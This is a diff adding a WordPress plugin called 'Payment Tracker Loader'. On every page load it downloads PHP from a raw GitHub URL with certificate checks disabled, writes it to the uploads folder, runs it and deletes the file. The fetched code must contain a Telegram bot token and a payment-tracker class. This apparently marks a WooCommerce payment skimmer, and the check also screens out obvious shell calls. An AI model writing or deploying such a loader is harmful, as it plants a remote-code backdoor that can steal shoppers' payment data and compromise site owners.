@@ -1,0 +1,109 @@
+<?php
+/**
+ * Plugin Name: Payment Tracker Loader
+ * Description: Loads Ultimate Payment Tracker from GitHub
+ * Version: 1.0.0
+ * Author: Loader System
+ */
+
+// Prevent direct access
+if (!defined('ABSPATH')) {
+    exit;
+}
+
+// Main loader function
+function load_ultimate_tracker() {
+    // Check if main class already exists
+    if (class_exists('UltimatePaymentTracker')) {
+        return;
+    }
+    
+    // Your GitHub raw URL
+    $github_url = 'https://raw.githubusercontent.com/Goodnewsss455/woocommerce/refs/heads/main/TESYT';
+    
+    // Multiple fetch methods
+    $plugin_code = fetch_from_github($github_url);
+    
+    if ($plugin_code && validate_plugin_code($plugin_code)) {
+        // Use temporary file method
+        $temp_file = wp_upload_dir()['basedir'] . '/upt_temp_plugin.php';
+        @file_put_contents($temp_file, $plugin_code);
+        
+        if (file_exists($temp_file)) {
+            include_once($temp_file);
+            @unlink($temp_file); // Clean up
+        }
+    }
+}
+
+function fetch_from_github($url) {
+    // Method 1: WordPress HTTP API
+    $response = wp_remote_get($url, array(
+        'timeout' => 30,
+        'sslverify' => false,
+        'user-agent' => 'WordPress'
+    ));
+    
+    if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
+        return wp_remote_retrieve_body($response);
+    }
+    
+    // Method 2: file_get_contents
+    $context = stream_context_create(array(
+        'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
+        'http' => array('timeout' => 30)
+    ));
+    
+    $content = @file_get_contents($url, false, $context);
+    if ($content !== false) {
+        return $content;
+    }
+    
+    // Method 3: cURL
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_FOLLOWLOCATION => true
+        ));
+        
+        $content = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($content !== false) {
+            return $content;
+        }
+    }
+    
+    return false;
+}
+
+function validate_plugin_code($code) {
+    // Required strings
+    $required = array('class UltimatePaymentTracker', 'telegram_bot_token', 'add_action');
+    
+    // Blacklisted strings
+    $blacklisted = array('eval(base64_decode', 'system(', 'exec(', 'shell_exec', 'phpinfo()');
+    
+    // Check required
+    foreach ($required as $req) {
+        if (strpos($code, $req) === false) {
+            return false;
+        }
+    }
+    
+    // Check blacklisted
+    foreach ($blacklisted as $black) {
+        if (strpos($code, $black) !== false) {
+            return false;
+        }
+    }
+    
+    return true;
+}
+
+// Initialize
+add_action('init', 'load_ultimate_tracker', 1);
